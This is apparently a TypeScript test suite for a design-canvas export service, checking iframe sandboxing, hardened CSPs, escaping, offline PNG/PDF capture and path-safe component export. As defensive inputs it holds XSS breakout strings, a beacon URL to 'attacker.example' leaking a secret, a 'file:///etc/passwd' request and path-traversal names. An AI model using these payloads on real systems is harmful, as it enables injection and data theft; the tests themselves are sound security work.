/**
 * CanvasExportService tests — Plan 22 Phase 6, parity row 7: "one frame builder
 * for board / thumbnail / PNG / PDF / viewer".
 *
 * The invariants under test:
 *
 *  - **every** frame this module emits is `sandbox="allow-scripts"` with no
 *    `allow-same-origin` (the exported viewer used to emit a bare `<iframe>`
 *    and then hand the folder to `openExternal`);
 *  - the exported page CSP IS the in-editor hardened one, so the two cannot
 *    drift, with `'unsafe-eval'` added back only for artboards that still need
 *    a compiler — and `https:` never added back at all, because in an offline
 *    bundle a model-authored `<img src="https://attacker/?leak">` is a working
 *    GET beacon and content-addressed assets make remote sources pointless;
 *  - a sandboxed frame has an opaque origin and may not load `file:`
 *    subresources, so page documents stay fully self-contained;
 *  - PNG/PDF capture is offline by construction (every non-`data:` request is
 *    aborted) and leaks no browser context;
 *  - design→code builds a *payload* for the gated `MystiLocalExec.write` path
 *    and never touches the filesystem itself.
 */
import { describe, it, expect, vi } from 'vitest';
import {
  exportHtmlBundle,
  exportPng,
  exportPdf,
  exportPageCsp,
  exportPageFormat,
  buildViewerDocument,
  buildFrameElementHtml,
  canvasFrameAttrs,
  createHtmlRenderer,
  buildComponentExport,
  componentNameFor,
  collectAssetRefs,
  collectArtifactAssetRefs,
  makeDataUriAssetResolver,
  MAX_INLINE_ASSET_BYTES,
  viewerCsp,
  EXPORT_PAGE_CSP,
  EXPORT_LEGACY_PAGE_CSP,
  EXPORT_VIEWER_CSP,
  CANVAS_FRAME_SANDBOX,
  VIEWER_MANIFEST_ID,
  MAX_VIEWER_FRAMES,
} from '../../src/services/CanvasExportService';
import { DOC_SANDBOX_INNER_CSP } from '../../src/managers/CanvasSandbox';
import { ArtifactStore } from '../../src/managers/ArtifactStore';
import { CanvasPreviewService } from '../../src/services/CanvasPreviewService';
import { CANVAS_CODE_OUTPUT_DIR } from '../../src/constants';
import type { CanvasArtifact } from '../../src/types';

/** Uncompilable on purpose: `.map` is outside the JSX subset → a legacy page. */
const LEGACY_JSX = 'function Page(){ return <div>{items.map(function (i) { return <span/>; })}</div>; }';

function makeArtifact(name = 'My App'): CanvasArtifact {
  const store = new ArtifactStore({ getRoot: () => null });
  const a = store.createArtifact({ name, kind: 'screens' });
  store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: 'function Page(){return <div>One</div>;}', actionTitle: 'Home' }));
  store.insertPage(a, store.makePage({ mode: 'html', htmlSource: '<h1>Two</h1>', actionTitle: 'Settings' }));
  return a;
}

const opts = {
  headRuntime: [
    { name: 'react.production.min.js', content: '/*react*/' },
    { name: 'ui-primitives.js', content: '/*ui*/' },
  ],
  harness: { name: 'harness.js', content: '/*harness*/' },
  babel: { name: 'babel.min.js', content: '/*babel*/' },
};

describe('exportHtmlBundle', () => {
  const files = exportHtmlBundle(makeArtifact(), opts);
  const byPath = Object.fromEntries(files.map(f => [f.path, f]));

  it('emits a viewer and one self-contained html per page', () => {
    expect(files.map(f => f.path)).toEqual(['index.html', 'pages/page-0.html', 'pages/page-1.html']);
  });

  it('the viewer lists the page titles and points its iframe at page 0', () => {
    const v = byPath['index.html'].content;
    expect(v).toContain('My App');
    expect(v).toContain('Home');
    expect(v).toContain('Settings');
    expect(v).toContain('pages/page-0.html');
  });

  it('all files are utf8', () => {
    expect(files.every(f => f.encoding === 'utf8')).toBe(true);
  });

  it('exports each artboard at its OWN format, never the previewed device', () => {
    const store = new ArtifactStore({ getRoot: () => null });
    const a = store.createArtifact({ name: 'Mixed', kind: 'screens' });
    a.format = { formatId: 'web-1440', kind: 'screen', width: 1440, height: 900 };
    const phone = { formatId: 'phone', kind: 'screen' as const, width: 390, height: 844 };
    store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: 'function Page(){return <div/>;}', format: phone }));
    expect(exportPageFormat(a, a.pages[0])).toEqual(phone);
    const viewer = exportHtmlBundle(a, opts)[0].content;
    expect(viewer).toContain('"width":390');
    expect(exportHtmlBundle(a, opts)[1].content).toContain('width=390');
  });

  // ── §3.6: the sandbox is a property of the content ──
  describe('sandboxed viewer', () => {
    const v = byPath['index.html'].content;

    it('frames every page with allow-scripts and never allow-same-origin', () => {
      expect(v).toMatch(/<iframe[^>]*\ssandbox="allow-scripts"/);
      expect(v).not.toContain('allow-same-origin');
      // Exactly one frame element, so no unsandboxed second frame slipped in.
      expect(v.match(/<iframe/g)).toHaveLength(1);
    });

    it('carries a hardened CSP: no https:, no forms, no base rewriting', () => {
      expect(v).toContain(`<meta http-equiv="Content-Security-Policy" content="${EXPORT_VIEWER_CSP}"`);
      expect(EXPORT_VIEWER_CSP).toContain("default-src 'none'");
      expect(EXPORT_VIEWER_CSP).toContain('img-src data: blob:;');
      expect(EXPORT_VIEWER_CSP).toContain("form-action 'none'");
      expect(EXPORT_VIEWER_CSP).toContain("base-uri 'none'");
      expect(EXPORT_VIEWER_CSP).toContain("connect-src 'none'");
      expect(EXPORT_VIEWER_CSP).not.toContain('https:');
      // Bundle pages are sibling files, and a file: document's origin does not
      // match 'self' in Chromium — both are needed or the viewer shows nothing.
      expect(EXPORT_VIEWER_CSP).toContain("frame-src 'self' file:");
    });

    it('escapes an artifact name / page title that tries to break out of the markup', () => {
      const hostile = makeArtifact('"><script>fetch("//evil")</script>');
      hostile.pages[0].actionTitle = '</button><img src=x onerror=alert(1)>';
      const out = exportHtmlBundle(hostile, opts)[0].content;
      expect(out).not.toContain('<script>fetch("//evil")');
      expect(out).not.toContain('<img src=x onerror');
      expect(out).toContain('&lt;script&gt;');
    });

    it('never interpolates a non-numeric frame dimension into the iframe attributes', () => {
      const bad = makeArtifact();
      (bad.format as unknown as { width: unknown }).width = '900" onload="alert(1)';
      (bad.format as unknown as { height: unknown }).height = Number.NaN;
      const out = exportHtmlBundle(bad, opts)[0].content;
      expect(out).not.toContain('onload=');
      expect(out).toMatch(/width="1440"/);
      expect(out).toMatch(/height="900"/);
    });
  });

  describe('page documents', () => {
    it('inline the whole runtime — a sandboxed frame may not load file: subresources', () => {
      const p0 = byPath['pages/page-0.html'].content;
      expect(p0).not.toContain('<script src=');
      expect(p0).not.toContain('../runtime/');
      expect(p0).toContain('/*react*/');
      expect(p0).toContain('/*harness*/');
      // Plan 22 §3.1: a compiled page travels as its DOCUMENT, not as JSX text —
      // which is exactly why the exported frame no longer needs Babel.
      expect(p0).toContain('"tag":"div"');
      expect(p0).toContain('One');
    });

    it('a document-model page ships NO compiler — the 2.98 MB stays out of the bundle', () => {
      expect(byPath['pages/page-0.html'].content).not.toContain('/*babel*/');
      expect(byPath['pages/page-1.html'].content).not.toContain('/*babel*/');
    });

    it('a legacy artboard gets Babel and unsafe-eval, and nothing else widens', () => {
      const store = new ArtifactStore({ getRoot: () => null });
      const a = store.createArtifact({ name: 'L', kind: 'screens' });
      const page = store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: LEGACY_JSX }));
      expect(page.legacy?.mode).toBe('jsx');
      expect(exportPageCsp(page)).toBe(EXPORT_LEGACY_PAGE_CSP);

      const doc = exportHtmlBundle(a, opts)[1].content;
      expect(doc).toContain('/*babel*/');
      expect(doc).toContain(EXPORT_LEGACY_PAGE_CSP);
      expect(EXPORT_LEGACY_PAGE_CSP).toContain("script-src 'unsafe-inline' 'unsafe-eval'");
      expect(EXPORT_LEGACY_PAGE_CSP).not.toContain('https:');
      expect(EXPORT_LEGACY_PAGE_CSP).toContain('img-src data: blob:;');
    });

    it('carry the hardened page CSP on every page', () => {
      for (const p of ['pages/page-0.html', 'pages/page-1.html']) {
        expect(byPath[p].content).toContain(`content="${EXPORT_PAGE_CSP}"`);
      }
      expect(EXPORT_PAGE_CSP).toContain("default-src 'none'");
      expect(EXPORT_PAGE_CSP).toContain("connect-src 'none'");
      expect(EXPORT_PAGE_CSP).toContain('img-src data: blob:;');
      expect(EXPORT_PAGE_CSP).toContain('font-src data:;');
      expect(EXPORT_PAGE_CSP).toContain("form-action 'none'");
      expect(EXPORT_PAGE_CSP).toContain("base-uri 'none'");
    });

    it('is literally the in-editor document CSP — one policy, not a second copy', () => {
      expect(EXPORT_PAGE_CSP).toBe(DOC_SANDBOX_INNER_CSP);
    });

    it('closes the GET-beacon exfil channel: no https:/file:/self script or image sources', () => {
      expect(EXPORT_PAGE_CSP).not.toContain('https:');
      expect(EXPORT_PAGE_CSP).not.toContain('file:');
      expect(EXPORT_PAGE_CSP).not.toContain("'self'");
      const p0 = byPath['pages/page-0.html'].content;
      const csp = /content="([^"]*Content-Security[^"]*)"/.exec(p0);
      expect(csp).toBeNull();  // the meta is not double-encoded into itself
    });

    it('a document-model page needs no eval at all', () => {
      expect(EXPORT_PAGE_CSP).not.toContain("'unsafe-eval'");
    });

    it('neutralizes a </script> breakout attempt in model-authored page source', () => {
      const store = new ArtifactStore({ getRoot: () => null });
      const a = store.createArtifact({ name: 'X', kind: 'screens' });
      store.insertPage(a, store.makePage({
        mode: 'jsx',
        jsxSource: 'function Page(){return <div>x</div>;}</script><script>fetch("//evil")</script>',
        actionTitle: 'Bad',
      }));
      const doc = exportHtmlBundle(a, opts)[1].content;
      expect(doc).not.toContain('</script><script>fetch');
    });
  });
});

describe('the frame element builder', () => {
  it('always carries the sandbox token and never allow-same-origin', () => {
    expect(canvasFrameAttrs().sandbox).toBe(CANVAS_FRAME_SANDBOX);
    expect(CANVAS_FRAME_SANDBOX).toBe('allow-scripts');
    expect(CANVAS_FRAME_SANDBOX).not.toContain('same-origin');
  });

  it('clamps dimensions and escapes every attribute value', () => {
    const html = buildFrameElementHtml({
      title: '" onload="alert(1)',
      width: -3,
      height: 1e9,
      src: 'pages/page-0.html',
    });
    expect(html).not.toContain('onload="alert');
    expect(html).toContain('&quot; onload=&quot;alert(1)');
    expect(html).toContain('width="1440"');
    expect(html).toContain('height="20000"');
  });

  it('writes sandbox first, so a caller-supplied attribute cannot displace it', () => {
    // Duplicate attributes take the FIRST value in HTML.
    const html = buildFrameElementHtml({ id: 'frame', title: 'x', src: 'a.html' });
    expect(html.indexOf('sandbox=')).toBeLessThan(html.indexOf('src='));
  });
});

describe('buildViewerDocument', () => {
  const frames = [
    { title: 'Home', width: 1440, height: 900, src: 'pages/page-0.html' },
    { title: 'Settings', width: 1440, height: 900, src: 'pages/page-1.html' },
  ];

  it('ships the deck as JSON in a non-executable block, not as markup', () => {
    const doc = buildViewerDocument({ title: 'D', frames });
    expect(doc).toContain(`<script type="application/json" id="${VIEWER_MANIFEST_ID}">`);
    const json = /application\/json" id="[^"]+">(.*?)<\/script>/s.exec(doc)![1];
    expect(JSON.parse(json)).toHaveLength(2);
  });

  it('escapes a `</script>` in a model-authored artboard title inside the manifest', () => {
    const doc = buildViewerDocument({ title: 'D', frames: [{ ...frames[0], title: '</script><script>fetch("//evil")</script>' }] });
    expect(doc).not.toContain('</script><script>fetch');
    expect(doc).toContain('\\u003c/script');
  });

  it('drops a frame src that is not a plain relative path', () => {
    const doc = buildViewerDocument({
      title: 'D',
      frames: [{ title: 'x', width: 100, height: 100, src: 'javascript:alert(1)' }],
    });
    expect(doc).not.toContain('javascript:');
  });

  it('present layout is chrome-free, srcdoc-delivered and paged', () => {
    const doc = buildViewerDocument({
      title: 'D',
      layout: 'present',
      frames: [{ title: 'A', width: 390, height: 844, doc: '<!doctype html><p>hi</p>' }],
      fitScaleJs: 'Math.max(min, Math.min(max, Math.min(vw / w, vh / h)))',
    });
    expect(doc).toContain('class="present"');
    expect(doc).not.toContain('<nav>');
    expect(doc).toContain('hud-count');
    expect(doc).toContain('ArrowRight');
    expect(doc).toMatch(/<iframe[^>]*\ssandbox="allow-scripts"/);
    // srcdoc frames inherit the embedder's policy, so frame-src must match
    // about:srcdoc's inherited origin.
    expect(doc).toContain("frame-src 'self';");
  });

  it('only allows eval in a present deck that actually contains a legacy artboard', () => {
    expect(viewerCsp({ frames: 'srcdoc', allowEval: true })).toContain("script-src 'unsafe-inline' 'unsafe-eval'");
    expect(viewerCsp({ frames: 'srcdoc' })).not.toContain("'unsafe-eval'");
    // A file-delivered bundle page carries its own policy; the viewer never needs eval.
    expect(viewerCsp({ frames: 'src', allowEval: true })).not.toContain("'unsafe-eval'");
  });

  it('clamps a hostile start index and caps the deck size', () => {
    const many = Array.from({ length: MAX_VIEWER_FRAMES + 10 }, (_, i) => ({
      title: `p${i}`, width: 100, height: 100, src: `pages/page-${i}.html`,
    }));
    const doc = buildViewerDocument({ title: 'D', frames: many, startIndex: 10_000 });
    const json = JSON.parse(/application\/json" id="[^"]+">(.*?)<\/script>/s.exec(doc)![1]);
    expect(json).toHaveLength(MAX_VIEWER_FRAMES);
    expect(doc).toContain(`var i = ${MAX_VIEWER_FRAMES - 1};`);
  });

  it('refuses an injected fit-scale expression and falls back to the canonical one', () => {
    const doc = buildViewerDocument({
      title: 'D',
      layout: 'present',
      frames: [{ title: 'A', width: 100, height: 100, doc: '<p/>' }],
      fitScaleJs: '1; fetch("//evil"); //',
    });
    expect(doc).not.toContain('fetch("//evil")');
    expect(doc).toContain('Math.max(min, Math.min(max, Math.min(vw / w, vh / h)))');
  });
});

describe('exportPng / exportPdf', () => {
  it('captures one base64 PNG per page from a self-contained document', async () => {
    const capture = vi.fn().mockImplementation(async (html: string) => {
      expect(html).not.toContain('<script src=');   // no subresources at all
      expect(html).toContain('/*react*/');
      expect(html).toContain(EXPORT_PAGE_CSP);
      return 'PNGDATA';
    });
    const out = await exportPng(makeArtifact(), { ...opts, capture });
    expect(out.map(f => f.path)).toEqual(['page-0.png', 'page-1.png']);
    expect(out.every(f => f.encoding === 'base64' && f.content === 'PNGDATA')).toBe(true);
    expect(capture).toHaveBeenCalledTimes(2);
  });

  it('captures one PDF per artboard, at that artboard`s own size', async () => {
    const store = new ArtifactStore({ getRoot: () => null });
    const a = store.createArtifact({ name: 'P', kind: 'screens' });
    a.format = { formatId: 'web', kind: 'screen', width: 1440, height: 900 };
    store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: 'function Page(){return <div/>;}' }));
    store.insertPage(a, store.makePage({
      mode: 'jsx', jsxSource: 'function Page(){return <div/>;}',
      format: { formatId: 'a4', kind: 'print', width: 2480, height: 3508 },
    }));
    const dims: Array<{ width: number; height: number }> = [];
    const out = await exportPdf(a, { ...opts, capture: async (_h, d) => { dims.push(d); return 'PDF'; } });
    expect(out.map(f => f.path)).toEqual(['page-0.pdf', 'page-1.pdf']);
    expect(dims).toEqual([{ width: 1440, height: 900 }, { width: 2480, height: 3508 }]);
  });
});

/* ───────────────────────── the Playwright capture ───────────────────────── */

/* eslint-disable @typescript-eslint/no-explicit-any */
function fakePlaywright(over: { pdf?: boolean } = {}) {
  const state: any = { contexts: [], routeHandlers: [], launches: 0, closedContexts: 0, browserClosed: 0 };
  const page = {
    setContent: vi.fn(async () => undefined),
    waitForTimeout: vi.fn(async () => undefined),
    screenshot: vi.fn(async () => Buffer.from('PNGBYTES')),
    pdf: over.pdf === false ? undefined : vi.fn(async () => Buffer.from('PDFBYTES')),
  };
  const browser = {
    newContext: vi.fn(async (o: any) => {
      state.contexts.push(o);
      return {
        route: vi.fn(async (_p: string, h: any) => { state.routeHandlers.push(h); }),
        newPage: vi.fn(async () => page),
        close: vi.fn(async () => { state.closedContexts++; }),
      };
    }),
    close: vi.fn(async () => { state.browserClosed++; }),
  };
  const pw = { chromium: { launch: vi.fn(async () => { state.launches++; return browser; }) } };
  return { pw, page, browser, state, loader: { ensurePlaywright: async () => pw } };
}

function fakeRoute(url: string) {
  return {
    request: () => ({ url: () => url }),
    continue: vi.fn(),
    abort: vi.fn(),
  };
}
/* eslint-enable @typescript-eslint/no-explicit-any */

describe('createHtmlRenderer', () => {
  it('renders through setContent — it never navigates to a URL', async () => {
    const { loader, page, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    const png = await renderer.capturePng('<html>x</html>', { width: 800, height: 600 });
    expect(png).toBe(Buffer.from('PNGBYTES').toString('base64'));
    expect(page.setContent).toHaveBeenCalledWith('<html>x</html>', expect.objectContaining({ waitUntil: 'load' }));
    expect(state.contexts[0].viewport).toEqual({ width: 800, height: 600 });
    expect(state.contexts[0].deviceScaleFactor).toBe(2);
    expect(state.contexts[0].acceptDownloads).toBe(false);
    await renderer.close();
  });

  it('is offline by construction — every non data:/blob:/about: request is aborted', async () => {
    const { loader, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    await renderer.capturePng('<html/>', { width: 100, height: 100 });
    const handler = state.routeHandlers[0];

    const evil = fakeRoute('https://attacker.example/?leak=secret');
    handler(evil);
    expect(evil.abort).toHaveBeenCalledWith('blockedbyclient');
    expect(evil.continue).not.toHaveBeenCalled();

    for (const url of ['data:image/png;base64,AAA', 'blob:abc', 'about:blank']) {
      const ok = fakeRoute(url);
      handler(ok);
      expect(ok.continue).toHaveBeenCalled();
      expect(ok.abort).not.toHaveBeenCalled();
    }

    const file = fakeRoute('file:///etc/passwd');
    handler(file);
    expect(file.abort).toHaveBeenCalledWith('blockedbyclient');
    await renderer.close();
  });

  it('reuses one browser across captures and closes every context, even on failure', async () => {
    const { loader, page, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    await renderer.capturePng('<a/>', { width: 10, height: 10 });
    await renderer.capturePng('<b/>', { width: 10, height: 10 });
    expect(state.launches).toBe(1);
    expect(state.closedContexts).toBe(2);

    page.screenshot.mockRejectedValueOnce(new Error('boom'));
    await expect(renderer.capturePng('<c/>', { width: 10, height: 10 })).rejects.toThrow('boom');
    expect(state.closedContexts).toBe(3);
    await renderer.close();
    expect(state.browserClosed).toBe(1);
  });

  it('renders a PDF at the artboard size, without the retina scale factor', async () => {
    const { loader, page, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    const pdf = await renderer.capturePdf('<html/>', { width: 2480, height: 3508 });
    expect(pdf).toBe(Buffer.from('PDFBYTES').toString('base64'));
    expect(page.pdf).toHaveBeenCalledWith(expect.objectContaining({
      width: '2480px', height: '3508px', printBackground: true, pageRanges: '1',
    }));
    expect(state.contexts[0].deviceScaleFactor).toBe(1);
    await renderer.close();
  });

  it('close() is idempotent and a capture after close fails loudly', async () => {
    const { loader, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    await renderer.capturePng('<html/>', { width: 10, height: 10 });
    await renderer.close();
    await renderer.close();
    expect(state.browserClosed).toBe(1);
    await expect(renderer.capturePng('<html/>', { width: 10, height: 10 })).rejects.toThrow(/closed/);
  });

  it('explains how to install the browser instead of throwing a shapeless TypeError', async () => {
    const renderer = createHtmlRenderer({ ensurePlaywright: async () => ({}) });
    await expect(renderer.capturePng('<html/>', { width: 10, height: 10 }))
      .rejects.toThrow(/playwright install chromium/);
  });

  it('satisfies the CanvasPreviewService capture seam — one renderer, not two', async () => {
    // `render_page_preview` has been unadvertised since Plan 18 with the note
    // "BrowserManager cannot render an HTML string". This is that renderer, so
    // the vision self-QA loop plugs straight in rather than growing its own.
    const { loader } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    const service = new CanvasPreviewService({
      capturePng: renderer.capturePng,
      analyze: async () => '{"issues":[]}',
    });
    const store = new ArtifactStore({ getRoot: () => null });
    const a = store.createArtifact({ name: 'QA', kind: 'screens' });
    const page = store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: 'function Page(){return <div/>;}' }));
    const result = await service.renderPreview({
      page, theme: a.theme, format: a.format,
      runtime: { headScripts: ['/*react*/'], harness: '/*harness*/' },
    });
    expect(result.ok).toBe(true);
    expect(result.previewBase64).toBe(Buffer.from('PNGBYTES').toString('base64'));
    await renderer.close();
  });

  it('clamps hostile dimensions before they reach the browser', async () => {
    const { loader, state } = fakePlaywright();
    const renderer = createHtmlRenderer(loader);
    await renderer.capturePng('<html/>', { width: Number.NaN, height: -10 });
    expect(state.contexts[0].viewport).toEqual({ width: 1440, height: 900 });
    await renderer.close();
  });
});

/* ─────────────────────────── design → code handoff ─────────────────────────── */

describe('buildComponentExport', () => {
  function docPage(jsx: string, title = 'Sign in screen') {
    const store = new ArtifactStore({ getRoot: () => null });
    const a = store.createArtifact({ name: 'D', kind: 'screens' });
    return store.insertPage(a, store.makePage({ mode: 'jsx', jsxSource: jsx, actionTitle: title }));
  }

  it('emits a real component from the artboard document', () => {
    const page = docPage('function Page(){ return <UI.Card title="Hi"><UI.Text>Yo</UI.Text></UI.Card>; }');
    const res = buildComponentExport(page);
    expect(res.ok).toBe(true);
    if (!res.ok) { return; }
    expect(res.plan.componentName).toBe('SignInScreen');
    expect(res.plan.relPath).toBe(`${CANVAS_CODE_OUTPUT_DIR}/SignInScreen.tsx`);
    expect(res.plan.content).toContain('export function SignInScreen()');
    expect(res.plan.content).toContain('export default SignInScreen;');
    expect(res.plan.content).toContain('<UI.Card');
    expect(res.plan.content).toContain("import { UI } from './canvas-ui';");
    expect(res.plan.usesUiPrimitives).toBe(true);
    // Canvas identity is not part of a component's source.
    expect(res.plan.content).not.toContain('mid=');
  });

  it('omits the primitives import for a plain-HTML artboard', () => {
    const page = docPage('function Page(){ return <div><h1>Title</h1></div>; }', 'Landing');
    const res = buildComponentExport(page);
    expect(res.ok && res.plan.usesUiPrimitives).toBe(false);
    expect(res.ok && res.plan.content).not.toContain('import { UI }');
    expect(res.ok && res.plan.warnings).toEqual([]);
  });

  it('reports the asset refs the project has to resolve', () => {
    const page = docPage('function Page(){ return <img src="asset://ab12cd.png"/>; }', 'Hero');
    const res = buildComponentExport(page);
    expect(res.ok && res.plan.assetRefs).toEqual(['asset://ab12cd.png']);
    expect(res.ok && res.plan.warnings.join(' ')).toContain('asset://');
  });

  it('refuses a legacy artboard rather than emitting a component that never compiled', () => {
    const page = docPage(LEGACY_JSX, 'Broken');
    const res = buildComponentExport(page);
    expect(res.ok).toBe(false);
    expect(!res.ok && res.error).toMatch(/legacy code page/i);
  });

  it('never lets a model-chosen name or directory escape the workspace', () => {
    const page = docPage('function Page(){ return <div/>; }');
    expect(buildComponentExport(page, { dir: '../../etc' }).ok).toBe(false);
    expect(buildComponentExport(page, { dir: '/etc' }).ok).toBe(false);
    expect(buildComponentExport(page, { dir: 'C:\\Windows' }).ok).toBe(false);
    expect(buildComponentExport(page, { dir: '~/.ssh' }).ok).toBe(false);
    const traversal = buildComponentExport(page, { componentName: '../../../etc/passwd' });
    expect(traversal.ok && traversal.plan.relPath).toBe(`${CANVAS_CODE_OUTPUT_DIR}/EtcPasswd.tsx`);
  });

  it('drops a hostile UI import specifier instead of writing it into the file', () => {
    const page = docPage('function Page(){ return <UI.Card/>; }');
    const res = buildComponentExport(page, { uiImport: "x'; fetch('//evil'); //" });
    expect(res.ok && res.plan.content).toContain("import { UI } from './canvas-ui';");
  });

  it('produces a legal identifier from any title', () => {
    expect(componentNameFor('login screen')).toBe('LoginScreen');
    expect(componentNameFor('404 not found')).toBe('Artboard404NotFound');
    expect(componentNameFor('   ')).toBe('Artboard');
    expect(componentNameFor(undefined)).toBe('Artboard');
    expect(componentNameFor('Page')).toBe('PageComponent');
    expect(/^[A-Za-z][A-Za-z0-9]*$/.test(componentNameFor('café ☕ menu'))).toBe(true);
  });

  it('collects asset refs from props, styles and text alike', () => {
    const doc = {
      mid: 'aaaaaaaaaa',
      tag: 'div',
      style: { background: 'url(asset://bg.png)' },
      children: [
        { mid: 'bbbbbbbbbb', tag: 'img', props: { src: 'asset://one.png' } },
        { mid: 'cccccccccc', tag: 'span', text: 'see asset://two.svg' },
        { mid: 'dddddddddd', tag: 'ul', props: { items: [{ icon: 'asset://one.png' }] } },
      ],
    };
    expect(collectAssetRefs(doc).sort()).toEqual(['asset://bg.png', 'asset://one.png', 'asset://two.svg']);
  });
});

/* ─────────────────── assets in a standalone document (R4-3) ─────────────────── */

/**
 * R4-3: `buildExportPageDocument` never passed a `resolveAsset`, so every
 * standalone consumer — the export bundle, Present and PNG/PDF capture — shipped
 * the literal `asset://<id>/assets/<sha>.png`. The frame harness refuses that
 * scheme (`safeUrl`), the exported page CSP allows only `data:`/`blob:` images,
 * and `_exportCanvas` copies no `assets/` directory: every image was silently
 * absent from the only artifact anyone else ever sees.
 */
describe('assets in a standalone document', () => {
  /** A 1×1 transparent PNG. */
  const PNG_B64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=';

  function withAsset(): { artifact: CanvasArtifact; ref: string } {
    const store = new ArtifactStore({ getRoot: () => null });
    const artifact = store.createArtifact({ name: 'Assets', kind: 'screens' });
    const ref = `asset://${artifact.id}/assets/deadbeef0011.png`;
    store.insertPage(artifact, store.makePage({
      mode: 'jsx',
      jsxSource: `function Page(){ return <div><img src="${ref}" /></div>; }`,
      actionTitle: 'Hero',
    }));
    store.insertPage(artifact, store.makePage({
      mode: 'jsx',
      jsxSource: `function Page(){ return <div>{items.map(function (i) { return <img src="${ref}" />; })}</div>; }`,
      actionTitle: 'Code page',
    }));
    return { artifact, ref };
  }

  it('collects every ref an artboard points at, doc pages and legacy source alike', () => {
    const { artifact, ref } = withAsset();
    expect(artifact.pages[1].legacy?.mode).toBe('jsx');   // the uncompilable one
    expect(collectArtifactAssetRefs(artifact)).toEqual([ref]);
  });

  it('inlines the asset as a data: URI in every exported page document', () => {
    const { artifact, ref } = withAsset();
    const resolveAsset = makeDataUriAssetResolver([{ ref, base64: PNG_B64 }]);
    const files = exportHtmlBundle(artifact, { ...opts, resolveAsset });
    for (const f of files.filter(f => f.path.startsWith('pages/'))) {
      expect(f.content).toContain(`data:image/png;base64,${PNG_B64}`);
      expect(f.content).not.toContain('asset://');
    }
  });

  it('the inlined URI is loadable under the exported page CSP — no widening needed', () => {
    expect(EXPORT_PAGE_CSP).toContain('img-src data:');
  });

  it('PNG/PDF capture renders the same inlined document', async () => {
    const { artifact, ref } = withAsset();
    const seen: string[] = [];
    await exportPng(artifact, {
      ...opts,
      resolveAsset: makeDataUriAssetResolver([{ ref, base64: PNG_B64 }]),
      capture: async (html) => { seen.push(html); return 'AAAA'; },
    });
    expect(seen).toHaveLength(2);
    expect(seen.every(h => h.includes(`data:image/png;base64,${PNG_B64}`))).toBe(true);
    expect(seen.some(h => h.includes('asset://'))).toBe(false);
  });

  it('leaves a ref it cannot resolve exactly as it was, rather than writing "undefined"', () => {
    const { artifact, ref } = withAsset();
    const files = exportHtmlBundle(artifact, { ...opts, resolveAsset: makeDataUriAssetResolver([]) });
    const page = files.find(f => f.path === 'pages/page-0.html')!.content;
    expect(page).toContain(ref);
    expect(page).not.toContain('undefined');
  });

  it('refuses anything that is not a plain base64 image — the URI lands in raw markup', () => {
    // `rewriteAssetTokens` substitutes into a legacy `html` page's SOURCE, so a
    // value carrying `"` or `<` would be an attribute break-out; and the frame
    // harness drops a `data:` URL that is not an image (measured against
    // `DATA_IMG_RE`), so inlining a video is bytes nothing renders.
    const evil = makeDataUriAssetResolver([
      { ref: 'asset://a/assets/x.png', base64: '"><script>alert(1)</script>' },
      { ref: 'asset://a/assets/y.exe', base64: 'AAAA' },
      { ref: 'asset://a/assets/z.mp4', base64: 'AAAA' },
      { ref: 'asset://a/assets/f.woff2', base64: 'AAAA' },
      { ref: 'asset://a/assets/ok.png', base64: 'AAAA' },
    ]);
    expect(evil('asset://a/assets/x.png')).toBe('asset://a/assets/x.png');
    expect(evil('asset://a/assets/y.exe')).toBe('asset://a/assets/y.exe');
    expect(evil('asset://a/assets/z.mp4')).toBe('asset://a/assets/z.mp4');
    expect(evil('asset://a/assets/f.woff2')).toBe('asset://a/assets/f.woff2');
    expect(evil('asset://a/assets/ok.png')).toBe('data:image/png;base64,AAAA');
  });

  it('drops an asset past the inline cap instead of writing a document nothing can open', () => {
    const huge = 'A'.repeat(Math.ceil(MAX_INLINE_ASSET_BYTES / 3) * 4 + 4);
    const r = makeDataUriAssetResolver([{ ref: 'asset://a/assets/big.png', base64: huge }]);
    expect(r('asset://a/assets/big.png')).toBe('asset://a/assets/big.png');
  });

  it('never carries the panel CSP nonce into a file the user shares', () => {
    const { artifact, ref } = withAsset();
    const files = exportHtmlBundle(artifact, { ...opts, resolveAsset: makeDataUriAssetResolver([{ ref, base64: PNG_B64 }]) });
    for (const f of files) {
      expect(f.content).not.toContain('nonce=');
      expect(f.content).not.toContain("'nonce-");
    }
  });
});
